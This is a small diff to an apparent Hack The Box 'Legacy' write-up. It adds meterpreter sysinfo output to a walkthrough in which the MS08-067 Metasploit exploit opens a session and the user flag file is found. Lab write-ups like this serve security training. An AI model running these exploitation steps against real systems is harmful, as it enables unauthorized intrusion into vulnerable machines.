@@ -167,6 +167,15 @@ Active sessions
 msf5 exploit(windows/smb/ms08_067_netapi) > sessions 1
 [*] Starting interaction with 1...
 
+meterpreter > sysinfo
+Computer        : LEGACY
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+
 meterpreter > search -f user.txt
 Found 1 result...
     c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
